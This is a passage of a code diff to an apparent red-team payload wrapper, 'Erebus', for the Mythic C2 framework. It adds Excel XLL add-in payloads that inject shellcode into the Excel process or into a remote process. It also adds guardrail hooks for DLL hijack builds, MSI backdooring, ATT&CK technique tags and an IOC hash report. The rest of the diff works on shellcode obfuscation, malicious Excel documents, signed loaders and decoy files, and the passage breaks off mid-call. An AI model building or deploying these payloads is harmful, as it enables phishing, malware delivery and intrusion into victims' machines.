@@ -1,4 +1,4 @@
-'''
+﻿'''
 - Author(s): Lavender-exe // hunterino-sec // Whispergate
 - Title: Erebus
 - Description: Initial Access Wrapper
@@ -28,9 +28,6 @@ try:
     from erebus_wrapper.erebus.modules.archive.container_msi import (
         build_msi,
         hijack_msi,
-        add_multiple_files_to_msi,
-        ErebusActionTypes,
-        ErebusInstallerToolkit
     )
 except ImportError:
     build_msi = _plugin_loader.get_function("build_msi")
@@ -76,10 +73,16 @@ except ImportError:
     sign_with_provided_cert = _plugin_loader.get_function("sign_with_provided_cert")
 
 try:
-    from erebus_wrapper.erebus.modules.plugin_payload_maldocs import generate_excel_payload, backdoor_existing_excel
+    from erebus_wrapper.erebus.modules.plugin_payload_maldocs import (
+        backdoor_existing_excel,
+        generate_xll_template,
+        register_xll_function
+    )
 except ImportError:
     generate_excel_payload = _plugin_loader.get_function("generate_excel_payload")
     backdoor_existing_excel = _plugin_loader.get_function("backdoor_existing_excel")
+    generate_xll_template = _plugin_loader.get_function("generate_xll_template")
+    register_xll_function = _plugin_loader.get_function("register_xll_function")
 
 
 
@@ -97,6 +100,11 @@ import asyncio
 import subprocess
 import tempfile
 import shutil
+import hashlib
+import shlex
+import re
+import zipfile
+from datetime import datetime
 from pathlib import Path
 
 
@@ -106,9 +114,7 @@ ENCRYPTION_METHODS = {
     # "AES256_ECB" :  "aes_ecb",
     # "CHACHA20"   :  "chacha20",
     "RC4"        :  "rc4",
-    # "SALSA20"    :  "salsa20",
     "XOR"        :  "xor",
-    # "XOR_COMPLEX":  "xor_complex",
 }
 
 COMPRESSION_METHODS = {
@@ -148,15 +154,6 @@ ENCODING_TYPE_MAP = {
 SHELLCODE_FORMAT = {
     "C"          : "c",
     "CSharp"     : "csharp",
-    # "Nim"        : "nim",
-    # "Go"         : "go",
-    # "Python"     : "py",
-    # "Powershell" : "ps1",
-    # "VBA"        : "vba",
-    # "VBScript"   : "vbs",
-    # "Rust"       : "rust",
-    # "JavaScript" : "js",
-    # "Zig"        : "zig",
     "Raw"        : "raw",
 }
 
@@ -170,6 +167,7 @@ FINAL_PAYLOAD_EXTENSIONS = [
 ]
 
 
+
 class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
@@ -179,8 +177,6 @@ class ErebusWrapper(PayloadType):
     file_extension = "zip"
     supported_os = [
         SupportedOS.Windows
-        # SupportedOS.Linux, # Not Supported Yet
-        # SupportedOS.MacOS, # Not Supported Yet
     ]
 
     wrapper = True
@@ -310,7 +306,7 @@ appdomain (self)""",
                 HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
             ]
         ),
-        
+
         BuildParameter(
             name="0.8 Output Extension Source",
             parameter_type=BuildParameterType.ChooseOne,
@@ -357,7 +353,7 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
             ]
         ),
-        
+
   # MalDocs - Excel Backdooring
         BuildParameter(
             name="0.9 Create MalDoc",
@@ -456,6 +452,115 @@ appdomain (self)""",
             hide_conditions=[
                 HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                 HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro")
+            ]
+        ),
+
+        # XLL (Excel Add-In DLL) Parameters
+        BuildParameter(
+            name="0.9h XLL Payload Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Generate XLL (Excel Add-In DLL) instead of VBA macro - native DLL executed when Excel loads",
+            choices=["VBA Macro", "XLL Add-In DLL"],
+            default_value="VBA Macro",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9i XLL Injection Method",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Shellcode injection technique for XLL DLL - CreateThread (self), ProcessInject (remote)",
+            choices=["CreateThread (In-Process)", "ProcessInject (Remote)"],
+            default_value="CreateThread (In-Process)",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9j XLL Target Process",
+            parameter_type=BuildParameterType.String,
+            description="Target process for remote injection (e.g., C:\\Windows\\System32\\notepad.exe)",
+            default_value="C:\\Windows\\System32\\notepad.exe",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+                HideCondition(name="0.9i XLL Injection Method", operand=HideConditionOperand.EQ, value="CreateThread (In-Process)"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9k XLL Compiler",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Windows compiler to use for XLL DLL compilation (requires Windows build system)",
+            choices=["MSVC", "MinGW"],
+            default_value="MSVC",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9l XLL Guardrail Includes",
+            parameter_type=BuildParameterType.String,
+            description="Optional include block inserted before windows.h (e.g., #include <winsock2.h>)",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9m XLL Guardrail Code",
+            parameter_type=BuildParameterType.String,
+            description="Optional guardrail C/C++ code. Must define BOOL ErebusGuardrail(void) and return TRUE to execute.",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9n XLL Guardrail Extra Libs",
+            parameter_type=BuildParameterType.String,
+            description="Optional extra linker flags for XLL builds (e.g., -lws2_32)",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9o XLL Decoy XLSX",
+            parameter_type=BuildParameterType.File,
+            description="Optional custom XLSX used for XLL decoy arrays (XLSX/ZIP). Defaults to template.xlsx if not supplied.",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
             ]
         ),
@@ -488,6 +593,39 @@ If one is not uploaded then an example file will be used.""",
 NOTE: Shellcode Format must be set to C.
 NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
 """,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1 DLL Hijack Guardrail Includes",
+            parameter_type = BuildParameterType.String,
+            description = "Optional include block inserted before windows.h (e.g., #include <winsock2.h>)",
+            default_value = "",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.2 DLL Hijack Guardrail Code",
+            parameter_type = BuildParameterType.String,
+            description = "Optional guardrail C/C++ code. Must define BOOL ErebusGuardrail(void) and return TRUE to execute.",
+            default_value = "",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.3 DLL Hijack Guardrail Extra Libs",
+            parameter_type = BuildParameterType.String,
+            description = "Optional extra linker flags for hijack builds (e.g., -lws2_32)",
+            default_value = "",
+            required = False,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
             ]
@@ -813,45 +951,136 @@ generated if none have been entered.""",
 ]
 
     build_steps = [
-        BuildStep(step_name = "Gathering Files",
+        BuildStep(step_name = "[T1005] - Gathering Files",
                   step_description = "Copy files to temporary location"),
 
-        BuildStep(step_name = "Header Check",
+        BuildStep(step_name = "[T1027] - Header Check",
                   step_description = "Check file for MZ Header"),
 
-        BuildStep(step_name = "Shellcode Obfuscation",
+        BuildStep(step_name = "[T1027] - Shellcode Obfuscation",
                   step_description = "Obfuscating shellcode based on selected options"),
 
-        BuildStep(step_name = "Gathering DLL Exports for Hijacking",
+        BuildStep(step_name = "[T1518] - Gathering DLL Exports for Hijacking",
                   step_description = "Extracts exports from the uploaded DLL to be used for proxying"),
 
-        BuildStep(step_name = "Compiling DLL Payload",
+        BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                   step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),
 
-        BuildStep(step_name = "Compiling Shellcode Loader",
+        BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
             step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),
 
-        BuildStep(step_name = "Compiling ClickOnce Loader",
+        BuildStep(step_name = "[T1027] - Compiling ClickOnce Loader",
             step_description = "Compiling ClickOnce Loader with Obfuscated Raw Agent Shellcode"),
 
-        BuildStep(step_name = "Sign Shellcode Loader",
+        BuildStep(step_name = "[T1553.006] - Sign Shellcode Loader",
             step_description = "Signing the Shellcode Loader with a code signing certificate"),
 
-        BuildStep(step_name = "Backdooring MSI",
+        BuildStep(step_name = "[T1218.007] - Backdooring MSI",
                   step_description = "Injecting payload into existing MSI installer"),
 
-        BuildStep(step_name = "Adding Trigger",
+        BuildStep(step_name = "[T1137.006] - Adding Trigger",
                   step_description = "Creating trigger to execute given payload"),
 
-        BuildStep(step_name = "Creating Decoy",
+        BuildStep(step_name = "[T1036.008] - Creating Decoy",
                   step_description= "Creating a placeholder decoy file"),
 
-        BuildStep(step_name = "Creating MalDoc",
+        BuildStep(step_name = "[T1566.001] - Creating MalDoc",
                   step_description = "Creating or backdooring Excel document with VBA payload"),
 
-        BuildStep(step_name = "Containerising",
+        BuildStep(step_name = "[T1027] - Containerising",
                   step_description = "Adding payload into chosen container"),
     ]
+
+    def calculate_sha256(self, file_path: str) -> str:
+        """Calculate SHA256 hash of a file"""
+        sha256_hash = hashlib.sha256()
+        with open(file_path, "rb") as f:
+            for byte_block in iter(lambda: f.read(4096), b""):
+                sha256_hash.update(byte_block)
+        return sha256_hash.hexdigest()
+
+    def add_to_iocs(self, iocs_list: list, file_path: str, timestamp: str = None) -> None:
+        """Add a file's hash to IOCs list"""
+        if timestamp is None:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        try:
+            if os.path.exists(file_path):
+                sha256 = self.calculate_sha256(file_path)
+                filename = os.path.basename(file_path)
+                iocs_list.append({
+                    'timestamp': timestamp,
+                    'filename': filename,
+                    'sha256': sha256,
+                    'full_path': file_path
+                })
+        except Exception as e:
+            print(f"[!] Failed to calculate hash for {file_path}: {str(e)}")
+
+    def generate_iocs_file(self, iocs_list: list, output_path: str) -> None:
+        """Generate IOCs.txt file with all file hashes"""
+        if not iocs_list:
+            return
+
+        try:
+            with open(output_path, 'w') as f:
+                f.write("=" * 80 + "\n")
+                f.write("EREBUS WRAPPER - GENERATED INDICATORS OF COMPROMISE (IOCs)\n")
+                f.write("=" * 80 + "\n\n")
+                f.write(f"Generation Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
+                f.write(f"Total Files: {len(iocs_list)}\n\n")
+                f.write("-" * 80 + "\n")
+                f.write(f"{'Timestamp':<20} {'Filename':<40} {'SHA256 Hash':<60}\n")
+                f.write("-" * 80 + "\n\n")
+
+                for ioc in iocs_list:
+                    f.write(f"{ioc['timestamp']:<20} {ioc['filename']:<40} {ioc['sha256']:<60}\n")
+
+                f.write("\n" + "-" * 80 + "\n")
+                f.write("Detailed Information:\n")
+                f.write("-" * 80 + "\n\n")
+
+                for idx, ioc in enumerate(iocs_list, 1):
+                    f.write(f"[{idx}] {ioc['filename']}\n")
+                    f.write(f"    Timestamp: {ioc['timestamp']}\n")
+                    f.write(f"    SHA256:    {ioc['sha256']}\n")
+                    f.write(f"    Path:      {ioc['full_path']}\n\n")
+        except Exception as e:
+            print(f"[!] Failed to generate IOCs file: {str(e)}")
+
+    # def cleanup_xll_and_create_clean_xlsx(self, xll_path: str, doc_name: str, payload_dir) -> str:
+    #     """
+    #     After XLL execution, create a clean XLSX file from template and delete the XLL.
+    #     This follows the approach used in XLL_Phishing to execute the XLL and clean up after.
+
+    #     Args:
+    #         xll_path: Path to the compiled XLL file
+    #         doc_name: Document name (without extension)
+    #         payload_dir: Directory where payload files are stored
+
+    #     Returns:
+    #         Path to the clean XLSX file
+    #     """
+    #     try:
+    #         # Get path to template.xlsx in erebus_xll directory
+    #         xll_dir = Path(__file__).resolve().parent.parent / "agent_code" / "erebus_xll"
+    #         template_xlsx = xll_dir / "template.xlsx"
+
+    #         if not template_xlsx.exists():
+    #             raise FileNotFoundError(f"Template XLSX not found at {template_xlsx}")
+
+    #         # Create clean XLSX file from template
+    #         clean_xlsx_path = Path(payload_dir) / f"{doc_name}.xlsx"
+    #         shutil.copy(str(template_xlsx), str(clean_xlsx_path))
+
+    #         # Delete the XLL file
+    #         if os.path.exists(xll_path):
+    #             os.remove(xll_path)
+
+    #         return str(clean_xlsx_path)
+
+    #     except Exception as e:
+    #         raise Exception(f"Failed to cleanup XLL and create clean XLSX: {str(e)}")
 
     async def obfuscate_vba(self, vba_code):
         """Obfuscate VBA code locally or via plugin"""
@@ -881,6 +1110,8 @@ generated if none have been entered.""",
         - load-dll: DLL loading with custom entry points
         - dotnet: .NET assembly loading
         - script: VBScript/JScript execution
+
+        Uses Erebus.Helper on Windows or falls back to container MSI plugin on Linux.
         """
         msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
         if not msi_backdoor_uuid:
@@ -899,7 +1130,7 @@ generated if none have been entered.""",
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
-                StepName="Backdooring MSI",
+                StepName="[T1218.007] - Backdooring MSI",
                 StepStdout="Downloading uploaded MSI installer...",
                 StepSuccess=True,
             ))
@@ -913,12 +1144,12 @@ generated if none have been entered.""",
 
             # Generate random name if not provided
             if not custom_action_name:
-                custom_action_name = ErebusInstallerToolkit.generate_identifier(6, 12)
+                custom_action_name = ''.join(__import__('random').choices(__import__('string').ascii_letters, k=8))
 
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
-                StepName="Backdooring MSI",
+                StepName="[T1218.007] - Backdooring MSI",
                 StepStdout=f"Injecting payload into MSI installer (attack: {attack_type})...",
                 StepSuccess=True,
             ))
@@ -966,21 +1197,51 @@ generated if none have been entered.""",
                     # Use default for DLL
                     entry_point = "DllEntry"
 
-            # Call hijack_msi with advanced parameters
-            backdoored_msi_path = hijack_msi(
-                source_msi=source_msi_path,
-                payload_path=payload_file,
-                build_path=Path(agent_build_path),
-                custom_action_name=custom_action_name,
-                attack_type=attack_type,
-                entry_point=entry_point,
-                command_args=command_args,
-                condition=condition
-            )
+            # Try using Erebus.Helper on Windows first
+            backdoored_msi_path = None
+            try:
+                from agent_code.Erebus.Helper.main import MSIHelper
 
-            # Move the backdoored MSI into the payload directory
-            final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
-            shutil.copy2(backdoored_msi_path, final_msi_path)
+                # Use helper for MSI backdooring
+                msi_helper = MSIHelper()
+                final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
+
+                success = msi_helper.backdoor_msi(
+                    source_msi=str(source_msi_path),
+                    payload_path=str(payload_file),
+                    output_path=str(final_msi_path),
+                    attack_type=attack_type,
+                    entry_point=entry_point,
+                    command_args=command_args,
+                    custom_action_name=custom_action_name,
+                    condition=condition
+                )
+
+                if success and final_msi_path.exists():
+                    backdoored_msi_path = final_msi_path
+                    output_method = "Erebus.Helper"
+                else:
+                    raise RuntimeError("MSI helper returned failure status")
+
+            except ImportError:
+                # Fallback to container MSI plugin on Linux
+                output_method = "Container MSI Plugin"
+
+                # Call hijack_msi with advanced parameters
+                backdoored_msi_path = hijack_msi(
+                    source_msi=source_msi_path,
+                    payload_path=payload_file,
+                    build_path=Path(agent_build_path),
+                    custom_action_name=custom_action_name,
+                    attack_type=attack_type,
+                    entry_point=entry_point,
+                    command_args=command_args,
+                    condition=condition
+                )
+
+                # Move the backdoored MSI into the payload directory
+                final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
+                shutil.copy2(backdoored_msi_path, final_msi_path)
 
             # Build success message with attack details
             success_msg = f"Successfully backdoored MSI: {final_msi_path.name}\n"
@@ -995,7 +1256,7 @@ generated if none have been entered.""",
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
-                StepName="Backdooring MSI",
+                StepName="[T1218.007] - Backdooring MSI",
                 StepStdout=success_msg,
             ))
 
@@ -1003,7 +1264,7 @@ generated if none have been entered.""",
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
-                StepName="Backdooring MSI",
+                StepName="[T1218.007] - Backdooring MSI",
                 StepStdout=f"Failed to backdoor MSI: {str(e)}",
                 StepSuccess=False,
             ))
@@ -1026,7 +1287,7 @@ generated if none have been entered.""",
 
         match(self.get_parameter("3.0 Container Type")):
             case "7z":
-                  return build_7z(
+                return build_7z(
                     compression=self.get_parameter("3.1 Compression Level"),
                     password=self.get_parameter("3.2 Archive Password"),
                     build_path=Path(agent_build_path),
@@ -1085,6 +1346,10 @@ generated if none have been entered.""",
                 except Exception as e:
                     print(f"[!] Could not report plugin status: {e}")
 
+            # Initialize IOCs tracking list
+            iocs_list = []
+            generation_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
             agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
             copy_tree(str(self.agent_code_path), agent_build_path)
 
@@ -1101,11 +1366,21 @@ generated if none have been entered.""",
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
             encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
             encrypted_shellcode_path_dll = PurePath(agent_build_path) / "hijack" / "shellcode.hpp"
+            encrypted_shellcode_path_xll = PurePath(agent_build_path) / "erebus_xll" / "xll_shellcode.h"
+
+            # Build XLL in the main erebus_xll directory (inside the working build tree)
+            xll_build_dir = Path(agent_build_path) / "erebus_xll"
+            xll_build_dir.mkdir(parents=True, exist_ok=True)
+            xll_source_path = xll_build_dir / "xll_payload.cpp"
+            xll_config_path = xll_build_dir / "xll_config.h"
+            xll_shellcode_path = xll_build_dir / "xll_shellcode.h"
+            xll_inject_path = xll_build_dir / "xll_inject.h"
 
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
             encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
             encrypted_shellcode_path_dll = str(encrypted_shellcode_path_dll)
+            encrypted_shellcode_path_xll = str(encrypted_shellcode_path_xll)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -1130,7 +1405,7 @@ generated if none have been entered.""",
                 response.build_stderr = "No wrapped payload provided. The wrapped_payload is None."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
-                    StepName="Gathering Files",
+                    StepName="[T1005] - Gathering Files",
                     StepStdout="No wrapped payload provided (wrapped_payload is None).",
                     StepSuccess=False
                 ))
@@ -1144,7 +1419,7 @@ generated if none have been entered.""",
                 response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Gathering Files",
+                        StepName="[T1005] - Gathering Files",
                         StepStdout="Failed to write Mythic Shellcode to placeholder file.",
                         StepSuccess=False
                     ))
@@ -1155,7 +1430,7 @@ generated if none have been entered.""",
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID = self.uuid,
-                StepName = "Gathering Files",
+                StepName = "[T1005] - Gathering Files",
                 StepStdout = "Gathered files to obfuscate shellcode",
                 StepSuccess = True
             ))
@@ -1180,7 +1455,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Header Check",
+                        StepName="[T1027] - Header Check",
                         StepStdout="Found leading MZ header - supplied file was not shellcode",
                         StepSuccess=False
                     ))
@@ -1190,7 +1465,7 @@ generated if none have been entered.""",
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
-                StepName="Header Check",
+                StepName="[T1027] - Header Check",
                 StepStdout="No leading MZ header found in payload",
                 StepSuccess=True
             ))
@@ -1288,6 +1563,10 @@ generated if none have been entered.""",
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encrypted_shellcode_path_dll))
 
+                if self.get_parameter("0.9h XLL Payload Type") == "XLL Add-In DLL":
+                    shutil.copy(src=str(obfuscated_shellcode_path),
+                                dst=str(xll_shellcode_path))     
+
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
                     cmd = [
@@ -1322,7 +1601,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Shellcode Obfuscation",
+                        StepName="[T1027] - Shellcode Obfuscation",
                         StepStdout="Obfuscated Shellcode - Continuing to Next Step",
                         StepSuccess=True,
                     ))
@@ -1332,17 +1611,17 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Shellcode Obfuscation",
+                        StepName="[T1027] - Shellcode Obfuscation",
                         StepStdout="Obfuscated Shellcode - Continuing to Next Step",
                         StepSuccess=True,
                     ))
 
-            elif proc.returncode != 0:
+            elif process.returncode != 0:
                 response.payload = b""
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
-                    StepName="Shellcode Obfuscation",
+                    StepName="[T1027] - Shellcode Obfuscation",
                     StepStdout="Failed to obfuscate shellcode",
                     StepSuccess=False,
                 ))
@@ -1355,7 +1634,7 @@ generated if none have been entered.""",
                 response.status = BuildStatus.Error
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
-                    StepName="Shellcode Obfuscation",
+                    StepName="[T1027] - Shellcode Obfuscation",
                     StepStdout="Failed to obfuscate shellcode",
                     StepSuccess=False,
                 ))
@@ -1412,7 +1691,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Gathering DLL Exports for Hijacking",
+                        StepName="[T1518] - Gathering DLL Exports for Hijacking",
                         StepStdout=f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.",
                         StepSuccess=False,
                     ))
@@ -1423,7 +1702,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Gathering DLL Exports for Hijacking",
+                        StepName="[T1518] - Gathering DLL Exports for Hijacking",
                         StepStdout="DLL Proxied! Compiling Payload...",
                         StepSuccess=True,
                     ))
@@ -1450,6 +1729,21 @@ generated if none have been entered.""",
                 with open(config_hpp_destination, "w", encoding="utf-8") as config_file:
                     config_file.write(rendered_config)
 
+                # Render guardrail header for hijack payload
+                guardrail_includes = (self.get_parameter("1.1 DLL Hijack Guardrail Includes") or "").strip()
+                guardrail_code = (self.get_parameter("1.2 DLL Hijack Guardrail Code") or "").strip()
+                guardrail_template = environment.get_template("guardrail.hpp")
+                rendered_guardrail = guardrail_template.render(
+                    guardrail_includes=guardrail_includes,
+                    guardrail_code=guardrail_code
+                )
+
+                guardrail_hpp_destination = PurePath(hijack_dir) / "guardrail.hpp"
+                guardrail_hpp_destination = str(guardrail_hpp_destination)
+
+                with open(guardrail_hpp_destination, "w", encoding="utf-8") as guardrail_file:
+                    guardrail_file.write(rendered_guardrail)
+
                 # Use make to compile the DLL with all hijack directory files
                 cmd = [
                     "make",
@@ -1459,6 +1753,10 @@ generated if none have been entered.""",
                     f"DLL_NAME={dll_file_name}",
                     f"TEMPLATE_PATH={templates_path}",
                 ]
+
+                hijack_extra_libs = (self.get_parameter("1.3 DLL Hijack Guardrail Extra Libs") or "").strip()
+                if hijack_extra_libs:
+                    cmd.append(f"EXTRA_LIBS={hijack_extra_libs}")
 
                 process = await asyncio.create_subprocess_exec(
                     *cmd,
@@ -1482,7 +1780,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Compiling DLL Payload",
+                        StepName="[T1027.011] - Compiling DLL Payload",
                         StepStdout="DLL Loader Compiled!",
                         StepSuccess=True,
                     ))
@@ -1496,7 +1794,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Compiling DLL Payload",
+                        StepName="[T1027.011] - Compiling DLL Payload",
                         StepStdout="Failed to Compile DLL Payload",
                         StepSuccess=False,
                     ))
@@ -1548,7 +1846,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Configuring Shellcode Loader",
+                            StepName="[T1036] - Configuring Shellcode Loader",
                             StepStdout="Generated config.hpp with user-defined injection parameters",
                             StepSuccess=True,
                         ))
@@ -1558,7 +1856,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Configuring Shellcode Loader",
+                            StepName="[T1036] - Configuring Shellcode Loader",
                             StepStdout=f"Failed to render config.hpp: {str(e)}",
                             StepSuccess=False,
                         ))
@@ -1587,21 +1885,17 @@ generated if none have been entered.""",
                     shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")
 
                     if os.path.exists(payload_path):
-                        # Debug
-                        # response.payload = open(payload_path, "rb").read()
-                        # response.updated_filename = "erebus_loader.exe"
                         response.status = BuildStatus.Success
                         response.build_message = "Loader Compiled!"
                         response.build_stdout = output + "\n" + payload_path
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Compiling Shellcode Loader",
+                            StepName="[T1027] - Compiling Shellcode Loader",
                             StepStdout="Shellcode Loader Compiled!",
                             StepSuccess=True,
                         ))
 
-                        # return response
                     else:
                         response.status = BuildStatus.Error
                         response.build_message = "Failed to compile loader"
@@ -1609,7 +1903,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
